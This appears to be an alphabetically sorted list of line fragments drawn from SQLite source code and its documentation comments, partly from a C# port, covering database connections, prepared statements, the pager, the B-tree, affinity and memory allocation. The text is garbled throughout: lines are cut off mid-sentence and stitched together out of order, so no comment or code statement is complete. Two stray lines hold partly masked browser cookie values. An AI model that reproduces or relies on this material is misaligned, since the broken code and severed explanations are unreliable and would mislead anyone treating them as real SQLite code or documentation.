 [UPDATE] or [DELETE] statements since the [database connection] was opened.
 [count_changes pragma].
 [database connection]
 [database connection] (specified in the first argument).  The
 [database connection] any any given moment.  If another busy handler
 [database connection] at the same time.  See the [threading mode]
 [database connection] specified as the first argument.
 [database connection] to be called whenever an undefined collation
 [database connection] whose limit is to be set or queried.  The
 [database connection].
 [database connection].  Setting a new busy handler clears any
 [database connections] and [prepared statements].  But other mutexes
 [error code] on failure.
 [error code] or [extended error code] is returned.
 [error code] returned will be [SQLITE_ABORT].
 [error codes] or [extended error codes].  The legacy behavior was that
 [extended result code] even when extended result codes are
 [extended result code] for the most recent failed sqlite3_
 [extended result codes] feature of SQLite. The extended result
 [extended result codes] might be returned as well.
 [limits 
 [lookaside memory allocator] configuration for the [database connection].
 [max_page_count] [PRAGMA].
 [pagecache memory allocator] that was configured using 
 [prepared statement] statement is constructed to substitute
 [prepared statement].  If the virtual machine has not
 [prepared statement]. This routine returns 0 if pStmt is an SQL
 [prepared statements] associated with a [database connection] if desired.
 [protected sqlite3_value] objects.  There is one [sqlite3_value] object for
 [scratch memory allocator] configured using
 [sqlite3_auto_extension()] calls.
 [sqlite3_backup_finish()].
 [sqlite3_bind_parameter_index()] API if desired.  The index
 [sqlite3_bind_parameter_index()].
 [sqlite3_blob_open 
 [sqlite3_busy_timeout()] to name but three) that are methods on an
 [sqlite3_column_database_name 
 [sqlite3_column_value()] is unprotected.
 [sqlite3_config()] except that the changes apply to a single
 [sqlite3_config()] when the configuration option is
 [sqlite3_context 
 [sqlite3_create_collation_v2()].
 [sqlite3_create_function()] and [sqlite3_create_function16()]
 [sqlite3_create_module_v2()] with a NULL client data destructor.
 [sqlite3_errmsg()] or [sqlite3_errmsg16()] routines can be used to obtain
 [sqlite3_exec()] is running.
 [sqlite3_exec()].  The sqlite3_get_table() routine does not have access
 [sqlite3_extended_result_codes()] API.
 [sqlite3_file] object) with a pointer to an instance of this object.
 [sqlite3_finalize()] is called.  The memory space used to hold strings
 [sqlite3_finalize()] or after [sqlite3_step()] has returned
 [sqlite3_finalize()]).
 [sqlite3_free()] is used to free idxPtr if and only iff
 [sqlite3_free()] or [sqlite3_realloc()].
 [sqlite3_free()].
 [sqlite3_free_table()] is able to release the memory properly and safely.
 [sqlite3_get_table()] interface.  A result table records the
 [sqlite3_get_table()].  An example use for this
 [sqlite3_initialize()] or after shutdown by [sqlite3_shutdown()].
 [sqlite3_io_methods] object it uses a combination of
 [sqlite3_io_methods] object that defines methods for performing
 [sqlite3_malloc] and the pragma may attempt to free that memory
 [sqlite3_module.xOpen 
 [sqlite3_mutex_methods]
 [sqlite3_open16()].  The database connection must not have been closed.
 [sqlite3_pcache_methods] object.  SQLite copies of the current
 [sqlite3_prepare()] or its variants.  Authorization is not
 [sqlite3_prepare16()] and [sqlite3_prepare16_v2()].  At various
 [sqlite3_prepare16_v2()].
 [sqlite3_prepare_v2()] (and its variants) or [sqlite3_reset()] and
 [sqlite3_prepare_v2()] and [sqlite3_prepare16_v2()] or the older legacy
 [sqlite3_prepare_v2()] or [sqlite3_prepare16_v2()] or one of the legacy
 [sqlite3_prepare_v2()] or equivalent call that triggered the
 [sqlite3_prepare_v2()] or its variants.
 [sqlite3_release_memory()] will only be called when memory is exhausted.
 [sqlite3_reset()] nor [sqlite3_finalize()] have been called subsequently.
 [sqlite3_reset()] or [sqlite3_finalize()] in order to find one of the
 [sqlite3_reset_auto_extension()] prior to shutdown to free the memory.
 [sqlite3_result_value()] and [sqlite3_bind_value()].
 [sqlite3_set_authorizer 
 [sqlite3_shutdown()] and should deallocate any resources acquired
 [sqlite3_snprintf()] to convert that value to a UTF-8 string and returns
 [sqlite3_step()] has returned [SQLITE_ROW] and neither
 [sqlite3_step()] would only return a generic [SQLITE_ERROR] result code
 [sqlite3_test_control()] interface.
 [sqlite3_value_text16()] can be invalidated by a subsequent call to
 [sqlite3_vfs] object that defines the operating system interface that
 [sqlite3_vfs] object.
 [truncate optimization] is disabled and all rows are deleted individually.
 [unprotected sqlite3_value] object specified by the 2nd parameter.  The
 [unprotected sqlite3_value] object.  An unprotected sqlite3_value object
 [virtual table module] call this interface
 [virtual table] and are used
 [xFilter] method.
 _BTREE_H_ 
 _M.z == null )
 _MSC_VER 
 _M_IX86
 _PCACHE_H_ 
 _SQLITE3EXT_H_ 
 _SQLITE_HASH_H_ 
 _SQLITE_OS_H_ 
 __GNUC_MINOR__ >= 3) 
 __GNUC__ == 3 
 __attribute__((aligned(8))) macro.  
 __cplusplus 
 __i386__ 
 _device_id=516175fxxxxxxxxx90133c2
 _fmt < fmt.Length - 1 
 _fmt <= fmt.Length 
 _octo=GH1.1.3xxxxxxxxx5173
 _p4.ai = pP4
 _p4.i = i32n
 _p4.i = pP4
 _p4.pColl = pColl
 _p4.pColl = pP4
 _p4.pFunc = pFunc
 _p4.pFunc = pP4
 _p4.pI64 = pP4
 _p4.pKeyInfo = pKeyInfo
 _p4.pKeyInfo = pP4
 _p4.pMem = m
 _p4.pReal = pP4
 _p4.z = Encoding.UTF8.GetString( pP4 )
 _p4.z = c.ToString()
 _p4.z = pP4
 _p4.z = pP4.ToString()
 _pCell < pStop) 
 _pIter < pEnd) 
 _pOrWC
 _pOrWC < pOrWC.nTerm 
 _pt
 _pt < pWC.nTerm 
 a 32-bit counter that is incremented with each change.  The
 a CREATE TABLE statement.
 a KeyInfo structure (P4_KEYINFO). If it is a pointer to a KeyInfo
 a NULL output.
 a NULL pointer and write an error message to pErrorDb.
 a NULL pointer then the default [sqlite3_vfs] object is used.
 a NULL pointer.
 a NULL row.
 a NULL then store a NULL in P2.
 a NULL value in place of the table column that would have
 a NULL will be written into 
 a PRIMARY KEY or UNIQUE clause following the column definitions.
 a RESERVED lock to avoid race conditions and to avoid violating
 a ROLLBACK TO command is invoked on a SAVEPOINT that is a transaction
 a SELECT statement.
 a SELECT statement.  pE is a term in an ORDER BY or GROUP BY clause.
 a SIGFPE is issued. The following statement normalizes this
 a TK_COLUMN but was previously evaluated and cached in a register 
 a UNIQUE constraint violation are removed so that the new insert or
 a [prepared statement].  The first argument is the prepared statement
 a binary comparison operator comparing pLeft and pRight.
 a bit in a bit vector.
 a bitmask indicating which tables are used in that expression
 a block of memory after it has been released using
 a boolean expression that is usually true.  GCC is able to
 a btree handle is closed.
 a buffer of nBuf bytes. The OS layer should populate the
 a call to [sqlite3_backup_init()] and is destroyed by a call to
 a call to sqlite3_backup_step() is made a [shared lock] is obtained on
 a cell.  Make sure it is small enough so that at least minFanout
 a circumstance which the index cannot help us discover.  Ticket 
 a codec is in use.
 a column in table number iTable with a copy of the iColumn-th
 a comparison routine that defines the order of that sequence.
 a compelling need to use the wrappers.
 a consequence of calling sqlite3_initialize()).
 a constant.
 a convenient place since there is one WhereLevel for each FROM clause
 a copy of the iCol-th result-set column.  The subsequent call to
 a copy of the sqlite3_pcache_methods.pArg value. It can be used to set
 a cost of N.  A binary search of a table of N entries should have a
 a couple of kilobytes or so - potentially larger than the page
 a database and its journal file) that the sector size will be the
 a database is loaded that contains references to collation sequences
 a database.
 a deadlock.
 a deadlocked state if connection A has registered for an unlock-notify
 a default configuration using [sqlite3_config()].
 a description of the journal header format.
 a destructor function for the client data pointer.  SQLite will
 a detailed description of each routine.
 a different position in the file.  This allows code that has to
 a digit. Try to match 
 a dynamically allocated instance of the following structure.
 a ephemeral table.
 a expired BLOB handle fail with an return code of [SQLITE_ABORT].
 a floating-point then the value returned is the integer part.
 a fragment.  The total number of bytes in all fragments is recorded.
 a free-list page.
 a function is called via a function pointer. For example the
 a good breakout.
 a hash table that will hold up to BITVEC_MXHASH distinct values.
 a hexadecimal rendering as text.
 a hot journal may be left in the filesystem but no error is returned
 a hot-journal was just rolled back. In this case the journal
 a library that is new enough to support that API.
 a limit or offset is defined by pLimit and pOffset.  iLimit and
 a linear sequence of operations.  Each operation has an opcode
 a list of named expression (pEList).  The named expression list may
 a logic error in the application.  Future versions of SQLite might
 a malfunction or a deadlock.
 a member of the Index structure for subsequent use.
 a memory allocation given a particular requested size.  Most memory
 a min()/max() query if:
 a moveToChild() or moveToRoot() call would have detected corruption.  
 a multi-byte UTF8 character.
 a mutex before we enter sqlite3VdbeExec().  The Btrees are
 a mutex is held.  A internal mutex is held for a protected
 a negative nArg.  A function where the preferred text encoding
 a new VDBE is created.  So we are free to set addr to p->nOp-1 without
 a new database with a random name is created.  This randomly named
 a new entry is being inserted on the extreme right-end of the
 a new mutex.  The new mutex is recursive when SQLITE_MUTEX_RECURSIVE
 a new one if necessary.
 a new one that always throws a run-time error.
 a new page to the right-hand side and put the one new entry in
 a no-op
 a no-op and can never fail.  But we leave it in place as a safety.
 a no-op if is called with a NULL pointer.  Passing a NULL pointer
 a no-op).  
 a no-op.
 a non-purgable cache.
 a non-testing build.  These variables are not thread-safe.
 a number that was preceded by a minus sign.
 a page is moved to the free-list and then reused within the same
 a page is skipped if it meets either of the following criteria:
 a particular index given the name of that index
 a pathname in this VFS.
 a pointer to a Mem object.
 a pointer to a SrcList 
 a pointer to a Token structure 
 a pointer to a block of szPage bytes of data and the return value is
 a pointer to a dynamically allocated string where some other entity
 a pointer to a static preexisting mutex.  Three static mutexes are
 a pointer to a static preexisting mutex. {END}  Four static mutexes are
 a pointer to that trigger step.  The parser calls this routine when it
 a pointer to the [sqlite3_stmt] object returned from
 a pointer to the associated PgHdr1 structure.
 a pointer to the following static Mem object which contains the
 a pointer to the new sqlite3_backup object.
 a pointer to the page or NULL if the requested page is not
 a pointer written to ppVal. The caller is responsible for deallocating
 a positive value if pCur points at an etry that is larger than
 a power-of-two allocation.  This mimimizes wasted space in power-of-two
 a primary key (and this is the second primary key) then create an
 a prior call to sqlite3VdbeMakeLabel().
 a process operating on a database with a page-size of 65536 bytes
 a program instruction by instruction.
 a random byte is selected for a shared lock.  The pool of bytes for
 a read-transaction for all named database files.
 a read/write file handle.
 a record from within an Next loop.
 a reduce action) then the yy_reduce_ofst[] array is used in place of
 a reference to any table other than the iBase table.
 a reserved lock.  B tries to promote to exclusive but is blocked because
 a return code SQLITE_ABORT.
 a rollback journal.  Double-check to makes sure this is the case.
 a row to delete.
 a row trigger.  The data for the row is stored in VdbeCursor.pData and
 a second process is holding a reserved lock that it is trying
 a segfault.  See ticket 
 a single binary search.  But for x IN (...) we have to do a
 a single byte of the file that is designated as the reserved lock byte.
 a single database.  This routine is called to reclaim memory
 a single iteration. This means that the first row returned
 a single shared-btree. The memory is used by client code for its own
 a single table T (as shown in example B above) then create a new virtual
 a single table.
 a specific database to all table references where the database name
 a statement since we will be comparing table and column names
 a static mutex. {END}
 a structure for storing their state.
 a table as part of a full table scan.  Large numbers for this counter
 a table.  nRoot is the number of entries in aRoot.
 a temporary file for transient pager files and statement journals.
 a terminal symbol.  If the lookahead is a non-terminal (as occurs after
 a transaction.
 a trigger step.  Return a pointer to a TriggerStep structure.
 a v-table method.
 a valid [sqlite3_io_methods] object or to NULL.  xOpen must do
 a valid database file.
 a valid pointer.
 a variable length key value (which must be the same value as the
 a very large positive number to an integer results in a very large
 a virtual root page.  A virtual root page is when the real root
 a virtual table column.
 a write lock if P3==1.
 a zero character.  Any stray characters in zNum result in undefined
 a0..a7    ........ 
 a8..af    ........ 
 a: p0 (unmasked) 
 a: p0<<14 
 a: p0<<28 
 a: p2<<28 
 a: p4<<29 
 aArg==aDyn )
 aArg==aStatic) )
 aBucket[i] != null 
 aCol[].zType and aCol[].pColl missing 
 aConstraint =
 aConstraint[].iColumn.  aConstraint[].usable is TRUE if the
 aConstraint[].usable is true for constraints where the right-hand
 aCopy[i 
 aDb[1] is the database file used to hold temporary tables.  Additional
 aMem[] goes from 1..nMem 
 aNew.pSchema.enc != ENC( db ) )
 aOffset[i] is offset to start of data for i-th column 
 aPermute[i] : i
 aRegIdx[i - 1] == 0 ) continue
 aRegIdx[i] > 0 )
 aRegIdx[i]>0 
 aRoot[i] > 1)
 aSpace1 
 aStatic[] array allocated on the stack and the attempt to
 aType[i] holds the numeric type of the i-th column 
 aUsage =
 aXRef[i] is the index in pChanges.a[] of the
 aXRef[i]==-1 if the i-th column is not changed. 
 abandons the current operation and returns an error code (usually
 ability to run load_extension is turned off by default.  One
 able to participate in upper-case-to-lower-case mappings in EBCDIC
 about 25% faster for large insertions and deletions.
 about a cell.  The parseCellPtr() function fills in this structure
 about a single [database connection].  The first argument is the
 about errors. The extended result codes are enabled or disabled
 about the actual results of the select.
 about what parameters to pass to xFilter.  If argvIndex>0 then
 above are all no-ops
 above function sqlite3VtabUnlockList() for an explanation of why
 above has occurred.
 above is always successful - hence the ALWAYS on rc==SQLITE_OK.
 above silently ignore any invocations that pass a NULL pointer instead
 above sqlite3ExprDup() for details.
 above this class definition.
 abstract type for a mutex object.  The SQLite core never looks
 acceptable.
 access is denied. 
 access or modified by other modules.
 access the database and [SQLITE_BUSY] or [SQLITE_IOERR_BLOCKED] is returned.
 access them will result in a segfault or malfunction.
 access writes are not required by sqlite.
 accessPayload() (the worker function for sqlite3BtreeData() and
 accessed by users of the library.
 accessible via [sqlite3_errcode()] and [sqlite3_errmsg()] and related
 accessing read-only databases 
 accomplishes is to quieten purify.
 accordingly.
 acquire the complete header text.
 action code] that specifies
 action integer.
 active write statements. It is not possible to rollback a savepoint
 actual data in the bytes used for locking.  The pager never allocates
 actual disk read occurs. In this case the memory image of the
 actually called using Gosub and they do not Return.  EofA and EofB loop
 actually moved between pages.  
 actually occurs when doing a vacuum since the vacuum_db is initially
 actually write data to the file in this case.
 add an error message to pParse.zErrMsg and return NULL.  If all tables
 add half a day (from 2305813.5) 
 add new virtual terms onto the end of the WHERE clause.  We do not
 add vdbe code to break out of the processing loop after the
 add whole day if half day made one 
 add whole days (from 2305813.5) 
 add_column_fullname ::= fullname 
 added operation.
 added or changed.
 added to the column cache after this call are removed when the
 addition that after the string has been read and copied into
 additional information about auxiliary information bound to arguments
 additional information.
 additional parameters which are passed to
 addr < p.nOp ) /
 addr = pc)
 addrOpenEphm[] entries contain the address of OP_OpenEphemeral opcodes.
 addr]
 addr] )
 addr] = new VdbeOp()
 addr] == null ) p.aOp[i 
 address of the first operation added.
 advance zIn to point to the first byte of the next UTF-8 character.
 aff != SQLITE_AFF_INTEGER )
 aff != SQLITE_AFF_NONE )
 aff != SQLITE_AFF_NUMERIC )
 aff != SQLITE_AFF_REAL )
 aff != SQLITE_AFF_TEXT )
 aff == SQLITE_AFF_NONE )
 aff1 : aff2 )
 aff2 != '
 aff2 == '
 aff2 == 0 )
 aff2 >= SQLITE_AFF_NUMERIC )
 aff==SQLITE_AFF_NUMERIC ){
 aff==SQLITE_AFF_REAL) ){
 affRight != affLeft )
 affect the value of lsChange.
 affinity == SQLITE_AFF_NONE )
 affinity == SQLITE_AFF_NUMERIC )
 affinity == SQLITE_AFF_REAL
 affinity change.
 affinity is used. Note that the affinity conversions are stored
 affinity value.
 affinity_ok 
 after FROM clause ordering.
 after parsing is finished.
 after the t1 loop and rows with t1.x!=5 will never appear in
 after writing or truncating it.
 afterward. Having this macro allows us to cause the C compiler
 again in a different encoding.
 again until a timeout value is reached.  The timeout value is
 again with the correct page-size.
 again.
 against all schemas and we do not want those schemas being
 against the open file represented by the [sqlite3_file] object.
 aggregate functions 
 aggregate may take any number of arguments between 0 and the limit
 aggregate. A scalar SQL function requires an implementation of the xFunc
 aiRowEst[0] is suppose to contain the number of elements in the index.
 aiValues[j] != ( i 
 algorithm to employ whenever an attempt is made to insert a non-unique
 alias has not yet been computed.
 aliases in the result set.
 aligned memory buffer from which the scrach allocations will be
 alignment 
 all calls to the interfaces listed here are completed.
 all columns in all tables.  And for every TABLE.
 all corresponding LHS elements.  All this routine does is initialize
 all data has really hit the disk before nRec is updated to mark
 all elements of the IDLIST really are columns of the table and
 all indices everywhere.
 all information is held in cache. It is never written to disk.
 all its indices.
 all mutexes including the recursive
 all mutexing and puts SQLite into a mode where it can only be used
 all of the platform-specific files (os_
 all pointer map pages are set correctly. This is helpful while
 all queries that may be using any of the cursors that failed to save.
 all record selected by the WHERE clause have been updated.
 all stack elements before shutting the parser down.
 all terms of the WHERE clause.
 all that is required is to swap the byte order. This case is handled
 all the fields up to that point were equal. If the UNPACKED_INCRKEY
 all updated rows.
 allocate a larger array from the heap has failed.
 allocate it now.
 allocate the structure
 allocated along with the page) is the responsibility of the caller.
 allocated along with the specified page.
 allocated and filled in as necessary.  The calling procedure
 allocated by a single thread - the same thread in which this routine
 allocated dynamic mutex. {H17020} SQLite is careful to deallocate every
 allocated even if there is no FROM clause 
 allocated in chunks so most INSERTs do no allocation.  There is an
 allocated mutex.  SQLite is careful to deallocate every
 allocated page 
 allocated pgnoMove. If required (i.e. if it was not allocated
 allocated rather than point to the input string - which means that
 allocated space.  (Note:  pp is a char
 allocated.  Free the m object and return SQLITE_CORRUPT. 
 allocates space for and lazily popluates the overflow page-list
 allocating a new one so we don't have to have space for
 allocation error.  The memory allocation failure will be recorded in
 allocation of entries available to be filled.
 allocation which could not be statisfied by the [SQLITE_CONFIG_PAGECACHE]
 allocation which could not be statisfied by the [SQLITE_CONFIG_SCRATCH]
 allocation.
 allocation.  This routine might need to defragment in order to bring
 allocator is engaged to handle all of SQLites memory allocation needs.
 allocators round up memory allocations at least to the next multiple
 allowAffChng ) )
 allowed ) != 0 )
 allowed for an indexable WHERE clause term.  The allowed operators are
 allowed to refer to anything.)  If a reference is explicitly made
 allows a 64-bit integer to be encoded in 9 bytes.
 allows a schema that contains virtual tables to be loaded before
 along with each page reference. This space is available to the user
 alphabetic range where case conversions will mess up the
 already been [sqlite3_finalize 
 already been computed and is passed as the 4th parameter.
 already been dequoted.
 already been invalidated. Return SQLITE_ABORT in this case.
 already been written into the pDestDb handle. All that is left
 already in memory.
 already in the journal file (recorded in Pager.pInJournal) and
 already in the pager cache return NULL. Initialize the MemPage.pBt and
 already known.
 already lost fractional day precision.
 already open file.
 already provided an alternative.
 already successfully created a VDBE. 
 already uses the largest possible [ROWID].  The PRNG is also used for
 already. Return non-zero if a malloc() fails.
 also acquire a readlock on that file.
 also attached to the left entry.
 also cause a mutex deadlock.
 also check to make sure that the pointer to the function is
 also end up needing a new cell pointer.
 also incremented by the number of rows in the table being cleared.
 also return SQLITE_ERROR.  {A11309} There is no way to distinguish between
 also statisfies case 1 (such as B) we know that the optimizer will
 also used during testing of SQLite in order to specify an alternative
 alternative low-level memory allocation routines to be used in place of
 alternative low-level mutex routines to be used in place
 always defined.  The trigger must be in the same schema as the table
 always fully overwrite deleted information with zeros.
 always in UTF-8 encoding even if the named parameter was
 always negative and P2 values are suppose to be non-negative.
 always return an SQL NULL. This is useful because it means
 always returned.
 always safely abort as soon as the first unused slot is found 
 always spread across less pages than their corresponding tables.
 always use %q instead of %s when inserting text into a string literal.
 amt <= available 
 amt > (int)wrote )
 amt > 0 
 amt > 0)
 amt > nKey 
 an AND operator.
 an AUTOINCREMENT table. 
 an Ansi string regardless of the _UNICODE setting 
 an English language description of the error.
 an IO error code if opening or writing the journal file fails.
 an ON or USING clause.
 an OP_Trace instruction is always inserted by sqlite3VdbeGet() as soon as
 an OR operator.
 an SQL statement.
 an SQLite instance.  Shared libraries that intend to be loaded
 an SrcList
 an [SQLITE_LOCKED] error if the required locks on the shared-cache or
 an [sqlite3_pcache_methods] object.  This object specifies the interface
 an abort request is seen.
 an application-defined function to be a floating point value specified
 an application-defined function to be the BLOB whose content is pointed
 an appropriate error code is returned and 
 an appropriate error message might be left in pParse.  (OOM errors
 an argument and returns a pointer to the associated block of szPage
 an array of pages numbers were each page number is the root page of
 an array to marshal SQL function arguments in. This is only done the
 an array.
 an assertion fault occurs.
 an attached database. The third and fourth arguments passed to 
 an attempt is made to open a database table that another thread
 an effective call to sqlite3_shutdown() does any deinitialization.
 an equivalent collating sequence that uses a text encoding different
 an error code (usually SQLITE_CORRUPT).
 an error code is returned and ppChild is set to 0.
 an error is returned to the user.  
 an error is to use this function.
 an error of some kind.
 an error or constraint causes an implicit rollback to occur.
 an error state. 
 an error to call this function if pPager is opened on an in-memory
 an error.  ppPage and pPgno are undefined in the event of an error.
 an exact limit.
 an expression for the i-th column of the table.
 an in-memory journal
 an incompatible database file format.  Changing the PENDING byte
 an inconsistent cache.
 an incorrect TRUE could lead to a malfunction.
 an incorrect zDbName and an SQLITE_ERROR return from the underlying
 an index for tables to the left of the join.
 an index greater than all savepoints created explicitly using
 an index.  
 an index.  If no entry exists in P1 that matches the blob then jump
 an integer - it might be too big.
 an integer 0 (not exists) or 1 (exists) into a memory cell
 an integer number of milliseconds passed in as the first
 an integer power of 2. It sets variable pg1 to the identifier
 an integer.
 an integrity check
 an out-of-memory condition or IO error occured during a call to
 an unlock-notify callback is a pointer to an array of void
 an unpacked index key. This opcode removes that entry from the
 an upper-to-lower case map.  On EBCDIC machines we also need
 analogous to the O_EXCL and O_CREAT flags of the POSIX open()
 analysis only.
 analyzed by sqlite3ResolveExprNames().
 analyzed separately.  The original term is marked with TERM_COPIED
 and 
 and (14). 
 and 0 if it involves variables or function calls.
 and 0 to use the compile-time default.
 and 1 for the file holding temporary tables and some higher number
 and 30.  The upper bound on 30 is because a 32-bit integer bitmap
 and 8 bytes of magic data just written to the file. This is
 and AgtB jump to either L2 or to one of EofA or EofB.
 and BLOBs is freed automatically.  Do <b>not</b> pass the pointers returned
 and BtCursor.pKey. The cursor's state is set to CURSOR_REQUIRESEEK.
 and Expr.pRight variables (but not for any structures pointed to or
 and FULL=3.
 and IN operators.  Examples:
 and INSERT OR ABORT make no changes to the return value of this
 and LIMIT/OFFSET portion of DELETE and UPDATE statements.
 and M be the number of columns.
 and N where N is the number of columns in the compound SELECT.
 and NEW.
 and Token.n when Token.z==0.
 and VVV is an alpha-numeric parameter name. The values of these
 and WRC_Continue to continue.
 and [SQLITE_VERSION_NUMBER] 
 and [sqlite3_blob_close 
 and [sqlite3_create_function16()] routines that originally
 and [sqlite3_vfs_unregister()] interfaces manage this list
 and _finalize() will return NOMEM.
 and a UTF-16 string for sqlite3_create_collation16(). In all cases
 and a page is moved during an incremental vacuum then the page may
 and a positive value means synchronous is on.
 and a prompt to preface each trace message.  Tracing is turned off
 and accessPayload() used to retrieve the record into the
 and add it to a transient table srcTab.  The code generated
 and all locking correctly.  To do so would require that samba (or whatever
 and allocate the record number for the table entry now.  Before any
 and an Expr struct with the EP_TokenOnly flag set.
 and an error code and error message written into the [database connection] 
 and an error code is returned.
 and an error left in pParse.
 and as many as three operands.  The instruction is recorded
 and as the P1 argument to the OP_Savepoint instruction.
 and atof().  SQLite does not really use these functions.  It has its
 and attempts to write the column will be ignored.
 and autoinc. At this point there are two possibilities:
 and autovacuum mode can no longer be changed.
 and becomes the argvIndex-th entry in argv.  If aConstraintUsage[].omit
 and clearAllSharedCacheTableLocks()
 and code in pParse and return NULL. 
 and column is found but leave okToChngToIN false if not found.
 and column that query result column was extracted from.
 and comments that follow the final semicolon are ignored.
 and copy the current contents of the root-page to it. The
 and data to fit on the local page and for there to be no overflow
 and database name used
 and debugging only.
 and debugging purposes.  The mutexes still do not provide any
 and decode of the integers in a record header.  It is faster for the common
 and delete the master journal file. All the individual journal files
 and destroyed by [sqlite3_blob_close()].
 and dileterious behavior.
 and disabled if the argument is false.
 and does so if it is.
 and error code returned. This function may return SQLITE_NOMEM
 and error message from the VDBE into the main database structure.  But
 and finalization steps are omitted because those are handling by the
 and flags gets srcType (either MEM_Ephem or MEM_Static).
 and generate no code.
 and generates an error message.
 and has send his findings to the SQLite developers.  Frank
 and have an assigned type.  The results are de-ephemeralized as
 and if there are no other active statements on the same database
 and in other parts of this file means that at one branch will
 and initialisation script appropriate for the database being
 and initialize fields of the MemPage structure accordingly.
 and initialized on the first invocation and reused on all subsequent
 and internal memory usage by the SQLite library.  Scratch memory
 and isExplain parameters are only passed correct values the first time
 and it is possible that another thread might change the parameter
 and its length in 'len' (to be used next iteration of this loop).
 and leave 
 and limiting database size using the [max_page_count] [PRAGMA]
 and low-level memory allocation routines.
 and makes other simplifications to the WHERE clause in an attempt to
 and may not be used following a call to sqlite3_backup_finish().
 and never needs to be updated.
 and not its inode needs to be synced.
 and offset cache without causing any IO.
 and older scripts may have used numbers 0 for OFF and 1 for ON.
 and on any subqueries further down in the tree.  Return
 and other fields of Column are zeroed.
 and pKeyInfo to the KeyInfo structure required to navigate the
 and pTblList is the name of the table that is to be indexed.  Both will
 and pWalker.u.i==2 
 and pcache1LeaveMutex()).
 and populated with enough information so that if a power loss occurs
 and record that memory cell in iColumn.
 and reset(). Inserts are grouped into a transaction.
 and resets the aggregate accumulator registers in preparation
 and return pointers to the first and last elements of the new list.
 and returns 0).
 and returns the combined list.
 and root page 5 happened to be the largest root-page number in the
 and rowidChng are 1.  isUpdate is true for UPDATEs and false for
 and schema data structures between [database connection 
 and segfaults if you give it a long long int.
 and send them to the callback one by one.
 and set the mallocFailed flag in the database connection.
 and should not be accessed by other modules.
 and so froth.
 and so we would have difficulty writing coverage tests for that
 and sqlite3PagerGet() is that _get() will go to the disk and read
 and sqlite3WhereEnd() generates the code to close them.
 and sqlite3_backup_finish() to detect that they are being called
 and sqlite3_column_name16() returns a pointer to a zero-terminated
 and store the result in pMem.  Return the number of bytes read.
 and store the result in register P3.
 and store the result in register P3.  If the value in register P2
 and store the values of those terms in an array of registers
 and strftime(). The format string to pass to strftime() is supplied
 and strings are less than blobs.
 and subsequent parameters to this function. Any of these arguments may be
 and that no other connection has any open cursor that conflicts with
 and that the current process needs to reread the schema.
 and that this object is only useful to a tiny minority of applications
 and that yy_default[S] should be used instead.
 and the SELECT clause does not read from <table> at any time.
 and the SELECT subtree. 
 and the WhereInfo.wctrlFlags member.
 and the WhereMaskSet structure. Since WhereClause contains an 8-byte
 and the WhereTerm.u.pOrInfo field points to auxiliary information that
 and the callback returns [SQLITE_IGNORE] then the
 and the cell content area.  The btreeInitPage() call has already
 and the copy has idxParent set to the index of the original term.
 and the current statement change count (i.e. changes since last statement).
 and the database cannot be corrupted if this program
 and the encoding is enc.
 and the error message pointer.
 and the fact that the page size must be a power of 2.
 and the following statement to be compiled:
 and the highest instantaneous value is written into 
 and the index is UNIQUE and no terms on the tail of the ORDER BY
 and the index used to access it (if any).  If the table itself
 and the main file. The page is then marked not dirty.
 and the maximum number of scratch allocations (N).  The sz
 and the name of the database that contains the index.
 and the new term is marked with TERM_DYNAMIC (because it's pExpr
 and the next table on the list.  The parser builds the list this way.
 and the pager code use this trick (clearing the first byte
 and the probability of hitting the same cookie value is only
 and the requested lock. This means if a write-lock was already held
 and the second argument is the index of the column for which information
 and the second is the number of entries in the array.
 and the statement is automatically recompiled if an schema change
 and the value in register P2.
 and the value of Index.onError indicate the which conflict resolution
 and their memory is freed.  Any attempt to use a page associated
 and then generates code to remove both the table record and all index
 and then jump to address P2.
 and there are already pages in the cache (from a previous
 and this functions return value.
 and this routine is a no-op.  The underlying mutex is non-recursive.
 and thus when they need to flush their cache.
 and use its inversion. 
 and used as the file to be cached. Temporary files are be deleted
 and using that as the shared filemapping name.
 and whatever filename encoding is used by the particular Windows
 and will never change.  It does not need to be destroyed.  The
 and with zero for unused indices.
 and work forward so that the added virtual terms are never processed.
 and write that byte sequence into pCell[].  Overflow pages are
 and xFinal and NULL should be passed for xFunc. To delete an existing
 and you would have to make a second call to [sqlite3_reset()] in order
 and/or [sqlite3_set_auxdata()].
 and/or pParse.db.mallocFailed.
 another database connection.
 another is writing.
 another linked list headed by the sqlite3.pDisconnect member of the
 any btree routine is called.
 any cell). But it is important to pass the correct size to
 any database connection.
 any expr callbacks and SELECT callbacks that come from subqueries.
 any group of 3 or fewer unused bytes in the cell content area cannot
 any limit on the number of terms in a compount SELECT.
 any number of arguments will be returned.
 any of the IO operations to finalize the journal file or unlock the
 any other process from modifying the database.  The read lock is
 any size are atomic.  The SQLITE_IOCAP_ATOMICnnn values
 any subsequently attached databases also use the specified
 any such pages to the file.
 any virtual table method invocations made by the vdbe program. It is
 anybody smart enough to figure out the code is also likely smart
 anything else to the journal file (or commits/rolls back its
 anything else which is not an unabiguous reference to a database column.
 anything goes wrong.
 anything goes wrong.  [SQLITE_RANGE] is returned if the parameter
 anything is written. The format is:
 anything other than a full table scan on this table.  We might as
 ap.Length == 0 )
 apAll[i] != null 
 apArg[0] 
 apCell 
 apMem[]s should all be destroyed 
 apOld[2].pgno : 0
 apOld[i].nCell 
 apOld[i].nOverflow
 appear in the FROM clause if a different order is better able to make
 appear when assert() is disabled.  The following macro is therefore
 appears first.  A variable-length integer may not be more than 9 bytes long.
 appears in the pColumn parameter.  pColumn is NULL if IDLIST is omitted.
 appears to be a complete SQL statement.  A statement is judged to be
 append a integer to the name so that it becomes unique.
 application can specify an alternative memory allocation subsystem
 application is free to use the same [database connection] or the
 application must supply a custom mutex implementation using the
 application using -DSQLITE_DEBUG=1 at least once.  With DEBUG
 applications and so this routine is usually not necessary.  It is
 applications for any purpose.
 applications to access the same PRNG for other purposes.
 applied to all threads. The value specified for the soft heap limit
 architectures.
 are TK_REGISTER opcodes that refer to the precomputed values.
 are advised to follow the lead of the core.  {H17082} The core only
 are afterwards simply interpreted as text.
 are aligned to an address which is an integer multiple of
 are alike.
 are already attached to pTab->pTrigger.  But there might be additional
 are an increment to apply to the meta value after the vacuum.
 are any variables.
 are available at pSpace.  The db pointer is used as a memory context
 are based on typical values found in actual indices.
 are benign.
 are called from a different thread while any of these routines
 are coded to assume the single byte case is already handled (which
 are common to all implementations.
 are considered fatal except for SQLITE_BUSY and SQLITE_LOCKED.
 are contiguous memory cells starting at P3 to pass to the xUpdate
 are converted using sqlite3_snprintf().  Converting a BLOB to a string
 are counted.
 are designed for use on embedded systems where memory is scarce and
 are enabled and SQLite is threadsafe.  When the
